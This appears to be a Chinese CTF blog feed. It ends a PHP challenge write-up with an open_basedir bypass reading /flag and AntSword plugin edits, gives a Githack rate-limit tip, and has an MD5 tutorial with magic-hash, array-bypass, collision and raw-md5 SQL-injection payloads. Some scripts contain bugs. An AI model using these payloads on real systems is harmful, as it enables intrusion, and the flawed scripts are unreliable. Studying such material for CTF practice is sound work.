<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir(&#x27;qf&#x27;);chdir(&#x27;qf&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(file_get_contents(&#x27;/flag&#x27;));</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(22).png" alt="image.png"><br>至此，结束了一切。</p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>个人认为非常难，但是也挺偏向实战一点点，起码是一个很符合CTF的题目。主要的难点还是在理解那个php脚本的，要对应好监听的端口和php脚本里面的代码，其实这道题目用蚁剑的插件也可以做出来，不过要修改几个插件的代码。比较懒就不写了<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(23).png" alt="image.png"><br>贴个图证明我真的试过了，要记得改端口，还要把插件里面的函数**fsockopen <strong>改为</strong> pfsockopen **<br>附上修改文件：</p>
<ul>
<li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(24).png" alt="image.png"><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(25).png" alt="image.png"></li>
<li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(26).png" alt="image.png"></li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(27).png" alt="image.png"></li>
</ul>
<p>如果是手工操作的话还是要记得对应好端口。<br>不过这个蚁剑最后这些文件是创建成功了，但是连接不上就有点尴尬了.可能是我版本和别人不一样改的也就不行了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Githack无法下载源码的问题</title>
    <url>/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>Githack有个好坑的地方<br />刚开始的时候总是下载不到泄露的<code>php文件</code><br />要扫很多次才有可能下载到,可是要是是真实环境,扫了两遍没有可能就真的觉得没有了,那如何解决呢？<br />于是我进了源码看一下<br /><span id="more"></span><img src="/./../images/1/1-1.png" alt="image.png"><br />点击进入githack.py并编辑<br /><img src="/./../images/1/1-2.png" alt="image.png"><br />把他线程改低一点就可以了,流量不够大就可以不被拒绝访问<br />就可以下载到源码</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title>MD5碰撞</title>
    <url>/2022/08/23/MD5%E7%A2%B0%E6%92%9E/</url>
    <content><![CDATA[<p><a name="lCJgX"></a></p>
<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在CTF中可以说是经常碰到md5加密了，一般都是进行<code>强比较</code>抑或是<code>弱比较</code>，考法非常多，但是万变不离其中。只要我们掌握了原理，一切问题便迎刃而解了。<br><a name="NGMi1"></a></p>
<h2 id="简单了解MD5："><a href="#简单了解MD5：" class="headerlink" title="简单了解MD5："></a>简单了解MD5：</h2><ul>
<li>md5是一种加密算法，并且<code>不能防止碰撞破解</code>。</li>
<li>md5加密是不可逆的，这就意味着有<code>两串不同的字符串``加密出来的内容却是相同的</code></li>
<li>加密过程简单，碰撞还原字符难</li>
</ul>
<p><a name="rvOcf"></a></p>
<h2 id="PHP的弱比较："><a href="#PHP的弱比较：" class="headerlink" title="PHP的弱比较："></a>PHP的弱比较：</h2><p>先提两个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==123)</span><br><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong><font color='#ff9900'>不看答案想一下结果会是什么</font></strong></p>
<span id="more"></span>
<p>在没有认真总结前，完全不知道弱比较还要区分<code>与**字符串**类型比较</code>还是<code>与int类型比较</code><br>上述实例的结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><a name="C4062"></a></p>
<h3 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a>字符串与int类型比较:</h3><p>PHP规定当进行<code>字符串与数字的弱比较时</code>，会<code>进行如下步骤</code>：<br>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code><br>如果开头不为数字，则判断为false，即0。因此<br><code>(&quot;aaa123&quot;==0)</code> &#x3D;&gt;<code>true</code><br><code>(&quot;123a&quot;==123)</code> &#x3D;&gt;<code>true</code><br><strong>思维导图：</strong><br><img src="/./../images/2/2-1.png" alt="image.png1"><br><a name="ILEFW"></a></p>
<h3 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a>字符串与字符串比较：</h3><p>正如上面所言：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>);  //False</span><br></pre></td></tr></table></figure>
<p>因为这个是字符串之间进行比较，想要绕过这个弱比较只能用<code>0e</code>的方式。<br>在PHP中”0e”判断为科学计数法，<code>0e123就是0的10123次方</code><br>不难推出：<code>0e123456789==0e1</code> &#x2F;&#x2F; 因为0的任意次方都为0<br>不过有一个注意点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e345&quot;</span>  //True</span><br><span class="line"><span class="string">&quot;0e12adfc&quot;</span>==<span class="string">&quot;0e345&quot;</span>  //False</span><br><span class="line"></span><br><span class="line">在0e后面不能含有字母！！！</span><br><span class="line">在0e后面不能含有字母！！！</span><br><span class="line">在0e后面不能含有字母！！!</span><br><span class="line">否则判断为False</span><br></pre></td></tr></table></figure>
<p>#实例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;0e23253&quot;</span>==<span class="string">&quot;0e2345&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p><a name="eQQch"></a></p>
<h2 id="CTF的MD5弱比较"><a href="#CTF的MD5弱比较" class="headerlink" title="CTF的MD5弱比较"></a>CTF的MD5弱比较</h2><p>在CTF中，会遇到如下的MD5弱比较题目<br><a name="XWV4b"></a></p>
<h3 id="1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$md5_1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>];</span><br><span class="line"><span class="variable">$md5_2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_2</span>) &amp; <span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;try harder&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个时候就要利用<code>0e</code>的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？<br>1.脚本寻找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">CHARS = <span class="keyword">string</span>.ascii_letters + <span class="keyword">string</span>.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">cmp_md5</span>(substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> not stop_event.<span class="title function_ invoke__">is_set</span>():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(random.<span class="title function_ invoke__">choice</span>(CHARS) <span class="keyword">for</span> _ in <span class="title function_ invoke__">range</span>(size))</span><br><span class="line">        md5 = hashlib.<span class="title function_ invoke__">md5</span>(rnds)</span><br><span class="line">        value = md5.<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="comment"># print rnds</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            md5 = hashlib.<span class="title function_ invoke__">md5</span>(value)</span><br><span class="line">            <span class="keyword">if</span> md5.<span class="title function_ invoke__">hexdigest</span>()[start: start + str_len] == substr:</span><br><span class="line">                <span class="keyword">print</span> rnds + <span class="string">&quot;=&gt;&quot;</span> + value + <span class="string">&quot;=&gt;&quot;</span> + md5.<span class="title function_ invoke__">hexdigest</span>() + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                stop_event.<span class="title function_ invoke__">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].<span class="title function_ invoke__">strip</span>()</span><br><span class="line">    start_pos = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="title function_ invoke__">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.<span class="title function_ invoke__">cpu_count</span>()</span><br><span class="line">    stop_event = multiprocessing.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    processes = [multiprocessing.<span class="title function_ invoke__">Process</span>(target=cmp_md5, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p in processes:</span><br><span class="line">        p.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    <span class="keyword">for</span> p in processes:</span><br><span class="line">        p.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>
<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入命令</span><br><span class="line">python md5.py <span class="string">&quot;0e&quot;</span> 0</span><br><span class="line"><span class="string">&quot;0e&quot;</span> =&gt;要跑的字符</span><br><span class="line"> 0   =&gt;要跑的字符的起始位置</span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-2.png" alt="image.png"><br>脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑<br>2.百度</p>
<table>
<thead>
<tr>
<th>MMHUWUV	    0e701732711630150438129209816536</th>
</tr>
</thead>
<tbody><tr>
<td>MAUXXQC   	0e478478466848439040434801845361</td>
</tr>
<tr>
<td>IHKFRNS	    0e256160682445802696926137988570</td>
</tr>
<tr>
<td>GZECLQZ	    0e537612333747236407713628225676</td>
</tr>
<tr>
<td>GGHMVOE	    0e362766013028313274586933780773</td>
</tr>
<tr>
<td>GEGHBXL	    0e248776895502908863709684713578</td>
</tr>
<tr>
<td>EEIZDOI	    0e782601363539291779881938479162</td>
</tr>
<tr>
<td>DYAXWCA	    0e424759758842488633464374063001</td>
</tr>
</tbody></table>
<p><img src="/./../images/2/2-3.png" alt="image.png"><br>这样子就出flag了<br><a name="ArvDI"></a></p>
<h3 id="2-a-x3D-x3D-md5-a"><a href="#2-a-x3D-x3D-md5-a" class="headerlink" title="2.$a&#x3D;&#x3D;md5($a)"></a>2.$a&#x3D;&#x3D;md5($a)</h3><p>这一类题型要求满足$a是0e开头，且加密后也是0e开头<br>在网上收集了这些结果：</p>
<table>
<thead>
<tr>
<th>0e215962017	0e291242476940776845150308577824</th>
</tr>
</thead>
<tbody><tr>
<td>0e1284838308	   0e708279691820928818722257405159</td>
</tr>
<tr>
<td>0e1137126905	   0e291659922323405260514745084877</td>
</tr>
<tr>
<td>0e807097110	   0e318093639164485566453180786895</td>
</tr>
<tr>
<td>0e730083352      0e870635875304277170259950255928</td>
</tr>
</tbody></table>
<p>弱比较主要就是以上两种类型。<br><a name="UILG2"></a></p>
<h2 id="CTF的MD5强比较"><a href="#CTF的MD5强比较" class="headerlink" title="CTF的MD5强比较"></a>CTF的MD5强比较</h2><p><a name="X5Dcp"></a></p>
<h3 id="1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><p><a name="Ajb8Q"></a></p>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$md5_1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>];</span><br><span class="line"><span class="variable">$md5_2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_1</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_2</span>) &amp; <span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;try harder&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>md5_1[]=1&amp;md5_2[]=2</code><br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag<br><img src="/./../images/2/2-4.png" alt="image.png"><br><a name="q6lP9"></a></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>两串不一样的字符，加密结果却相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-5.png" alt="image.png"><br>这个我的脚本就跑不出来了，是网上收集的。<br><a name="r2uDz"></a></p>
<h2 id="题目实战："><a href="#题目实战：" class="headerlink" title="题目实战："></a>题目实战：</h2><p><a name="lz95C"></a></p>
<h3 id="1-BJDCTF2020-Easy-MD5"><a href="#1-BJDCTF2020-Easy-MD5" class="headerlink" title="1.[BJDCTF2020]Easy MD5"></a>1.[BJDCTF2020]Easy MD5</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题也是两个解法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">法一：</span><br><span class="line">param1[]=1&amp;param2[]=2</span><br><span class="line">法二：</span><br><span class="line">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><a name="jh3Lk"></a></p>
<h3 id="2-强网杯2020——Funhash"><a href="#2-强网杯2020——Funhash" class="headerlink" title="2.强网杯2020——Funhash"></a>2.强网杯2020——Funhash</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>] != <span class="title function_ invoke__">hash</span>(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>] || <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>]) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="EMcpk"></a></p>
<h4 id="levle-1"><a href="#levle-1" class="headerlink" title="levle 1"></a>levle 1</h4><p>很明显，这种是要md4加密，并且是”0e”+”数字” 加密后还是”0e”+”数字”的形式，上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md4</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">18</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        rnds = <span class="string">&quot;0e&quot;</span>+rnds</span><br><span class="line">        md4 = hashlib.new(<span class="string">&#x27;md4&#x27;</span>, rnds.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        value = md4.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span>(value)</span><br><span class="line">            <span class="keyword">if</span> value[<span class="number">2</span>:].isdigit():</span><br><span class="line">                <span class="built_in">print</span>(rnds)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md4, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()                </span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-6.png" alt="image.png"><br>测试一下，可行<br><img src="/./../images/2/2-7.png" alt="image.png"><br><a name="GT9CN"></a></p>
<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">法一：</span><br><span class="line">hash2[]=1&amp;hash3[]=2</span><br><span class="line">法二：</span><br><span class="line">hash2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;hash3=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><a name="Gvn9O"></a></p>
<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><img src="/./../images/2/2-8.png" alt="image.png"><br>结果：<br><img src="/./../images/2/2-9.png" alt="image.png"><br>只要构造 <code>xx &#39;or xxxx</code> 的形式就可以了<br>具体可以看<a href="https://blog.csdn.net/March97/article/details/81222922">这篇文章</a></p>
<p><a name="QMEO5"></a></p>
<h3 id="3-构造特定字符串"><a href="#3-构造特定字符串" class="headerlink" title="3.构造特定字符串"></a>3.构造特定字符串</h3><p>这个是我觉得以后为了避免大家都用现有的收集字符串解题而出的，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">123</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要构造一个开头是123且后面是字母的字符串：<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> rnds</span><br><span class="line">            <span class="built_in">print</span> value</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md4, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
